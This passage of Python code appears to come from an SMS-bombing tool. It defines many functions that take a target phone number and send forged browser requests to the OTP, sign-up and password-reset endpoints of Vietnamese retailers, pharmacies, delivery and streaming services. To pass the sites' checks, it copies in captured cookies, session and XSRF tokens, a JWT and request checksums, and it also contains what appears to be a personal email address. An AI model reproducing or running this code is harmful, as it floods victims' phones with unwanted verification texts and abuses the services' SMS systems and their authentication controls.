    'origin': 'https://winmart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://winmart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-api-merchant': 'WCM',
}

    json_data = {
    'firstName': 'Taylor Jasmine',
    'phoneNumber': phone,
    'masanReferralCode': '',
    'dobDate': '2005-08-05',
    'gender': 'Male',
}

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
def alf(phone):
    headers = {
    'authority': 'api.alfrescos.com.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'brandcode': 'ALFRESCOS',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'devicecode': 'web',
    'origin': 'https://alfrescos.com.vn',
    'pragma': 'no-cache',
    'referer': 'https://alfrescos.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    params = {
    'culture': 'vi-VN',
}

    json_data = {
    'phoneNumber': phone,
    'secureHash': 'ebe2ae8a21608e1afa1dbb84e944dc89',
    'deviceId': '',
    'sendTime': 1691127801586,
    'type': 1,
}

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)

def phuc(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://order.phuclong.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'userName': phone,
}

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data) 
  
def emart(phone):
    cookies = {
    'emartsess': 'gmdbftq46lqooc1s5iv9l7nsn0',
    'default': 'e6ec14ce933f55f7f1a9bb7355',
    'language': 'vietn',
    'currency': 'VND',
    '_fbp': 'fb.2.1691143292627.1008340188',
    '_gid': 'GA1.3.332853186.1691143293',
    '_gat_gtag_UA_117859050_1': '1',
    '_ga_ZTB26JV4YJ': 'GS1.1.1691143293.1.1.1691143433.0.0.0',
    '_ga': 'GA1.1.736434119.1691143293',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'emartsess=gmdbftq46lqooc1s5iv9l7nsn0; default=e6ec14ce933f55f7f1a9bb7355; language=vietn; currency=VND; _fbp=fb.2.1691143292627.1008340188; _gid=GA1.3.332853186.1691143293; _gat_gtag_UA_117859050_1=1; _ga_ZTB26JV4YJ=GS1.1.1691143293.1.1.1691143433.0.0.0; _ga=GA1.1.736434119.1691143293',
    'Origin': 'https://emartmall.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'X-Requested-With': 'XMLHttpRequest',
}

    data = {
    'mobile': phone,
}

    response = requests.post(
    'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
    cookies=cookies,
    headers=headers,
    data=data,
)
 
def hana(phone):
    cookies = {
    '_ym_uid': '1690554219913867740',
    '_ym_d': '1710341879',
    '_fbp': 'fb.1.1720103209034.327083033864980369',
    '_gcl_au': '1.1.2098605329.1720103209',
    '_ga_P2783EHVX2': 'GS1.1.1720103209.1.0.1720103209.60.0.0',
    '_ga': 'GA1.2.1065309191.1720103210',
    '_gid': 'GA1.2.543071985.1720103210',
    '_gat_UA-151110385-1': '1',
    '_tt_enable_cookie': '1',
    '_ttp': 'G5FqQUKlNy_Fx9r4kURNmkn6LOo',
    '_ym_visorc': 'b',
    '_ym_isad': '2',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'cache-control': 'no-cache',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_ym_uid=1690554219913867740; _ym_d=1710341879; _fbp=fb.1.1720103209034.327083033864980369; _gcl_au=1.1.2098605329.1720103209; _ga_P2783EHVX2=GS1.1.1720103209.1.0.1720103209.60.0.0; _ga=GA1.2.1065309191.1720103210; _gid=GA1.2.543071985.1720103210; _gat_UA-151110385-1=1; _tt_enable_cookie=1; _ttp=G5FqQUKlNy_Fx9r4kURNmkn6LOo; _ym_visorc=b; _ym_isad=2',
    'origin': 'https://vayvnd.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'login': phone,
    'trackingId': '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3',
}

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)

def kingz(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'domain': 'kingfoodmart',
    'origin': 'https://kingfoodmart.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
def med(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://id-v121.medpro.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://id-v121.medpro.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'appid': 'medpro',
    'cskhtoken': '',
    'locale': '',
    'momoid': '',
    'osid': '',
    'ostoken': '',
    'partnerid': 'medpro',
    'platform': 'pc',
}

    json_data = {
    'fullname': 'người dùng medpro',
    'deviceId': '401387b523eda9fc5998c36541400134',
    'phone': phone,
    'type': 'password',
}

    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
###
def ghn(phone):
    headers = {
    'authority': 'online-gateway.ghn.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'pragma': 'no-cache',
    'referer': 'https://sso.ghn.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
    'type': 'register',
}

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
 ###
def shop(phone):
    cookies = {
    '_gcl_au': '1.1.1745429184.1691586808',
    '_fbp': 'fb.1.1691586808676.1451418847',
    '_ga': 'GA1.2.1936138960.1691586808',
    '_gid': 'GA1.2.1897491687.1691674994',
    '_gat_UA-78703708-2': '1',
    '_ga_P138SCK22P': 'GS1.1.1691674994.3.1.1691675011.43.0.0',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.1745429184.1691586808; _fbp=fb.1.1691586808676.1451418847; _ga=GA1.2.1936138960.1691586808; _gid=GA1.2.1897491687.1691674994; _gat_UA-78703708-2=1; _ga_P138SCK22P=GS1.1.1691674994.3.1.1691675011.43.0.0',
    'Origin': 'https://shopiness.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://shopiness.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'action': 'verify-registration-info',
    'phoneNumber': phone,
    'refCode': '',
}

    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)  
###
def gala(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi',
    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI5M2RhNGUwNC00YWIwLTRiMDYtOTc4Ni01NjNlNjY1ZTU5NmIiLCJkaWQiOiI3ODNhMTcyNy02ZDFlLTRjZWMtYmU1OS0zNjViMmU1MWQxN2QiLCJpcCI6IjEuNTIuMTc1LjEzNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTcyMDEwNjEwMSwiZXhwIjoxNzM1NjU4MTAxfQ.TzzMuAseNbVYaSuWz5ufu4lEn9Uj_hrxh1aYxHyleJQ',
    'cache-control': 'no-cache',
    # 'content-length': '0',
    'origin': 'https://galaxyplay.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://galaxyplay.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'phone': phone,
}

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
####
def ahamove(sdt):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'mobile': phone,
    'name': 'khải',
    'email': 'khaissn@gmail.com',
    'country_code': 'VN',
    'firebase_sms_auth': 'true',
    'time': 1720101304,
    'checksum': 'Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg==',
}

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
def lon(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-channel': 'EStore',
}

    json_data = {
    'phoneNumber': phone,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
}

    response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
)
def medi(phone):
    cookies = {
    'SERVER': 'nginx3',
    '_gcl_au': '1.1.2035327165.1720297698',
    'XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D',
    'medicare_session': 'eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.510182867.1720297701',
    '_gid': 'GA1.2.1839608181.1720297709',
    '_gat_gtag_UA_257373458_1': '1',
    '_fbp': 'fb.1.1720297708926.352505189707594376',
    '_ga_CEMYNHNKQ2': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_8DLTVS911W': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_R7XKMTVGEW': 'GS1.1.1720297700.1.1.1720297727.33.0.0',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'SERVER=nginx3; _gcl_au=1.1.2035327165.1720297698; XSRF-TOKEN=eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D; _ga=GA1.2.510182867.1720297701; _gid=GA1.2.1839608181.1720297709; _gat_gtag_UA_257373458_1=1; _fbp=fb.1.1720297708926.352505189707594376; _ga_CEMYNHNKQ2=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_8DLTVS911W=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_R7XKMTVGEW=GS1.1.1720297700.1.1.1720297727.33.0.0',
    'Origin': 'https://medicare.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://medicare.vn/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0=',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'mobile': phone,
    'mobile_country_prefix': '84',
}

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
def acfc(phone):
    cookies = {
    '_evga_d955': '{%22uuid%22:%22a93baeb4ee0b4f94%22}',
    '_gcl_gs': '2.1.k1$i1720297927',
    '_gcl_au': '1.1.1109989705.1720297932',
    '_gcl_aw': 'GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB',
    '_ga': 'GA1.1.669040222.1720297933',
    '_sfid_599e': '{%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}',
    '_tt_enable_cookie': '1',
    '_ttp': 'XkRw_9JIScHjzJOJvMn0bzslTxh',
    'PHPSESSID': 'puf048o1vjsq9933top4t6qhv3',
    'aws-waf-token': '537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==',
    'form_key': 'z6U4dNbxwcokMy9u',
    '_fbp': 'fb.2.1720297944244.46181901986930848',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'mage-messages': '',
    'optiMonkClientId': 'c6552caa-6bee-d03e-34ca-6d9b47869e59',
    '_ga_PS7MEHMFY3': 'GS1.1.1720297933.1.1.1720297944.49.0.0',
    'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===',
    'optiMonkSession': '1720297946',
    'form_key': 'z6U4dNbxwcokMy9u',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_evga_d955={%22uuid%22:%22a93baeb4ee0b4f94%22}; _gcl_gs=2.1.k1$i1720297927; _gcl_au=1.1.1109989705.1720297932; _gcl_aw=GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB; _ga=GA1.1.669040222.1720297933; _sfid_599e={%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}; _tt_enable_cookie=1; _ttp=XkRw_9JIScHjzJOJvMn0bzslTxh; PHPSESSID=puf048o1vjsq9933top4t6qhv3; aws-waf-token=537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==; form_key=z6U4dNbxwcokMy9u; _fbp=fb.2.1720297944244.46181901986930848; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=c6552caa-6bee-d03e-34ca-6d9b47869e59; _ga_PS7MEHMFY3=GS1.1.1720297933.1.1.1720297944.49.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===; optiMonkSession=1720297946; form_key=z6U4dNbxwcokMy9u',
    'origin': 'https://www.acfc.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.acfc.com.vn/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'number_phone': phone,
    'form_key': 'z6U4dNbxwcokMy9u',
    'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
}

    response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
def lote(phone):
    cookies = {
    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_gcl_au': '1.1.2136712951.1720299022',
    '_ga': 'GA1.1.164372556.1720299023',
    '_fbp': 'fb.1.1720299024438.549668172235070425',
    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
    'origin': 'https://www.lottemart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'username': phone,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
